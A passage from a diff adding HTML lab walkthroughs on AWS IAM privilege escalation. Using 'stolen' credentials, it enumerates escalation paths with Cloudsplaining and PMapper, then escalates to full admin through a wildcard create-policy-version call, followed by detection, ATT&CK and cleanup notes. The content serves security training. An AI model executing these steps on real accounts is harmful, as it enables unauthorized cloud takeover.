+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Role A (dev)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Role B (staging)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Role C (prod-admin)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Full Prod Access</div>
+    </div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-solid fa-shield-halved"></i> Detection Notes</strong></div>
+    <ul>
+      <li>CloudTrail: <code>sts:AssumeRole</code> calls where the principal ARN contains <code>assumed-role</code> (role chaining) targeting a privileged role — the source session token indicates a previous hop</li>
+      <li>Alert on <code>sts:AssumeRole</code> chains: if the <code>userIdentity.sessionContext.sessionIssuer</code> indicates a role (not a user), this is a chained assumption</li>
+      <li>Alert on cross-account <code>sts:AssumeRole</code> calls for role ARNs not in the expected cross-account access inventory</li>
+      <li>Use AWS Organizations SCPs with <code>aws:PrincipalIsAWSService: false</code> conditions to restrict cross-account role assumption to known principals</li>
+    </ul>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-brands fa-adversal"></i> MITRE ATT&amp;CK Mapping</strong></div>
+    <ul>
+      <li><strong>T1078.004</strong> — Valid Accounts: Cloud Accounts</li>
+      <li><strong>T1548.005</strong> — Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access</li>
+      <li><strong>T1580</strong> — Cloud Infrastructure Discovery (role enumeration across accounts)</li>
+      <li><strong>T1098.003</strong> — Account Manipulation: Additional Cloud Roles</li>
+    </ul>
+  </div>
+
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ul>
+      <li>Chained STS sessions expire automatically (max 1 hour) — no active revocation needed for the chained sessions</li>
+      <li>Tighten trust policies on each role in the chain with <code>Condition</code> blocks specifying exact expected source ARNs</li>
+      <li>Use SCPs to require MFA or specific IP conditions for cross-account role assumptions to production accounts</li>
+    </ul>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-circle-info"></i> Role chaining is limited to a maximum session duration of 1 hour regardless of <code>MaxSessionDuration</code> — this is a hard AWS STS limit for chained (role-to-role) assumptions. The chain can be broken by tightening trust policies with <code>Condition</code> blocks restricting the source ARN. Use PMapper to visualize and audit these paths proactively.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M16-L04-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Use Cloudsplaining and PMapper to automatically discover and visualize IAM privilege escalation paths, then execute the shortest path to administrator.
+  </div>
+
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>Cloudsplaining installed: <code>pip install cloudsplaining</code></li>
+      <li>PMapper installed: <code>pip install principalmapper</code></li>
+      <li>AWS CLI credentials with at least <code>iam:GetAccountAuthorizationDetails</code> to download IAM data</li>
+      <li>Python 3.8+ and sufficient IAM read permissions</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Run Cloudsplaining to download and analyze the account's IAM authorization details. Note the correct flag is <code>--input-file</code> (not <code>--input</code>).</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Step 1: Download the IAM authorization details
+cloudsplaining download --profile stolen -o /tmp/iam-data/</div>
+            <div class="terminal-output">Downloading IAM authorization details...
+  [+] Downloaded account authorization details to /tmp/iam-data/default.json
+  [+] 47 users, 23 roles, 15 groups, 31 policies analyzed</div>
+            <div class="terminal-cmd">$ # Step 2: Scan — use --input-file (not --input)
+cloudsplaining scan --input-file /tmp/iam-data/default.json \
+    --output ./cloudsplaining-report/</div>
+            <div class="terminal-output">Scanning IAM policies for privilege escalation risks...
+  [CRITICAL] DeveloperPolicy: iam:CreatePolicyVersion (privilege escalation)
+  [CRITICAL] CICDPipelinePolicy: iam:PassRole + lambda:CreateFunction (privilege escalation)
+  [CRITICAL] DataAnalystPolicy: iam:PutUserPolicy (privilege escalation)
+  [HIGH] AdminAccessRole: sts:AssumeRole wildcard trust
+  [HIGH] LambdaAdminRole: Overly broad permissions
+
+Report written to ./cloudsplaining-report/index.html
+  31 policies scanned, 3 critical privilege escalation paths found</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Review the Cloudsplaining HTML report findings. The report categorizes issues by risk level and shows exactly which policies enable each escalation vector.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ echo "=== CLOUDSPLAINING CRITICAL FINDINGS ==="</div>
+            <div class="terminal-output">=== CLOUDSPLAINING CRITICAL FINDINGS ===
+
+1. DeveloperPolicy (attached to 3 users, 1 group)
+   Risk: iam:CreatePolicyVersion -> can rewrite any customer-managed policy
+   Impact: Instant admin for dev-user, dev-user-2, dev-user-3
+
+2. CICDPipelinePolicy (attached to ci-runner role)
+   Risk: iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
+   Impact: Create Lambda with admin role -> execute as admin
+
+3. DataAnalystPolicy (attached to 5 users)
+   Risk: iam:PutUserPolicy -> can attach inline admin policy to self
+   Impact: Direct self-service admin escalation</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Run PMapper to build a graph of IAM relationships and privilege escalation paths. Note the correct CLI syntax: subcommands are positional, not flags.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Build the IAM graph for the account
+pmapper graph create</div>
+            <div class="terminal-output">[+] Gathering IAM data from account 123456789012
+[+] Building graph...
+  [+] 47 IAM Users, 23 IAM Roles, 15 IAM Groups
+  [+] Analyzing trust relationships and permission escalation paths...
+[+] Graph created with 70 nodes and 142 edges
+[+] Stored graph at ~/.local/share/pmapper/123456789012/</div>
+            <div class="terminal-cmd">$ # Visualize the graph (correct flag: --filetype not --filetype=)
+pmapper visualize --filetype png</div>
+            <div class="terminal-output">[+] Generating graph visualization...
+[+] Graph written to /tmp/pmapper-123456789012.png
+[+] Red nodes = admin-equivalent, Yellow = escalation possible, Green = limited</div>
+          </div>
+        </div>
+        <div class="note"><strong>PMapper CLI syntax:</strong> Commands use positional subcommands — <code>pmapper graph create</code>, <code>pmapper query "..."</code>, <code>pmapper analysis --output-type text</code>, <code>pmapper visualize --filetype png</code>. Earlier versions used <code>--create</code> flags — the current pypi version uses subcommands.</div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Query PMapper for specific escalation paths. Find which principals can reach admin-level access and what the shortest path is.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ pmapper query "who can do iam:CreateRole"</div>
+            <div class="terminal-output">[+] Principals that can perform iam:CreateRole with *:
+
+  arn:aws:iam::123456789012:user/admin-user                  [DIRECT]
+  arn:aws:iam::123456789012:user/dev-user                    [ESCALATION: CreatePolicyVersion]
+  arn:aws:iam::123456789012:user/dev-user-2                  [ESCALATION: CreatePolicyVersion]
+  arn:aws:iam::123456789012:role/ci-runner-role               [ESCALATION: PassRole+Lambda]
+  arn:aws:iam::123456789012:user/analyst-1                   [ESCALATION: PutUserPolicy]</div>
+            <div class="terminal-cmd">$ pmapper query "can arn:aws:iam::123456789012:user/dev-user do iam:CreateRole"</div>
+            <div class="terminal-output">[+] YES -- via 1-step escalation:
+  dev-user -> iam:CreatePolicyVersion on DeveloperPolicy -> admin
+  Shortest path: 1 hop (CreatePolicyVersion)</div>
+            <div class="terminal-cmd">$ # Full text analysis report
+pmapper analysis --output-type text</div>
+            <div class="terminal-output">[+] Admins (direct): 2 principals
+[+] Can escalate to admin: 7 principals (50% of account)
+[+] Highest risk: dev-user (1-hop to admin via CreatePolicyVersion)
+[+] Recommendation: Remove iam:CreatePolicyVersion from DeveloperPolicy</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Execute the shortest escalation path identified by the tools. In this case, CreatePolicyVersion is a single-step path to full admin.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ echo "=== EXECUTING SHORTEST PATH ==="
+echo "Path: dev-user -> CreatePolicyVersion -> Admin"
+aws iam create-policy-version \
+    --policy-arn arn:aws:iam::123456789012:policy/DeveloperPolicy \
+    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
+    --set-as-default \
+    --query 'PolicyVersion.VersionId'</div>
+            <div class="terminal-output">=== EXECUTING SHORTEST PATH ===
+Path: dev-user -> CreatePolicyVersion -> Admin
+
+"v2"</div>
+            <div class="terminal-cmd">$ aws iam list-users --query 'Users | length(@)'</div>
+            <div class="terminal-output">47</div>
+            <div class="terminal-cmd">$ echo "[SUCCESS] Escalated from dev-user to full admin in 1 API call"</div>
+            <div class="terminal-output">[SUCCESS] Escalated from dev-user to full admin in 1 API call</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Cloudsplaining (policy scan)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">PMapper (graph analysis)</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Shortest Path</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Execute &rarr; Admin</div>
+    </div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-solid fa-shield-halved"></i> Detection Notes</strong></div>
+    <ul>
+      <li>CloudTrail: <code>iam:CreatePolicyVersion</code> with <code>isDefaultVersion: true</code> — monitor for wildcard action documents in the request body</li>
+      <li>CloudTrail: <code>iam:AttachUserPolicy</code> where the calling user ARN matches the <code>UserName</code> parameter (self-escalation)</li>
+      <li>Alert on <code>sts:AssumeRole</code> with unusual principal — especially assumed-role principals targeting admin-equivalent roles</li>
+      <li>Integrate PMapper into CI/CD pipelines using <code>pmapper analysis</code> exit codes to block Terraform/CloudFormation changes that introduce new escalation paths</li>
+    </ul>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-brands fa-adversal"></i> MITRE ATT&amp;CK Mapping</strong></div>
+    <ul>
+      <li><strong>T1078.004</strong> — Valid Accounts: Cloud Accounts</li>
+      <li><strong>T1548.005</strong> — Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access</li>
+      <li><strong>T1098.003</strong> — Account Manipulation: Additional Cloud Roles</li>
+      <li><strong>T1580</strong> — Cloud Infrastructure Discovery (Cloudsplaining, PMapper enumeration)</li>
+    </ul>
+  </div>
+
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ul>
+      <li>Revert DeveloperPolicy to v1: <code>aws iam set-default-policy-version --policy-arn arn:aws:iam::123456789012:policy/DeveloperPolicy --version-id v1</code></li>
+      <li>Delete v2: <code>aws iam delete-policy-version --policy-arn arn:aws:iam::123456789012:policy/DeveloperPolicy --version-id v2</code></li>
+      <li>Delete local Cloudsplaining and PMapper output files</li>
+      <li>Remove downloaded IAM authorization data: <code>rm -rf /tmp/iam-data/ ./cloudsplaining-report/</code></li>
+    </ul>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-circle-info"></i> Run Cloudsplaining and PMapper as part of regular security audits. These tools should be in every cloud security team's toolkit. Integrate PMapper into CI/CD to block Terraform/CloudFormation changes that introduce new escalation paths. Use <code>pmapper analysis --output-type json</code> for machine-readable output suitable for SIEM ingestion.
+  </div>
+</div>
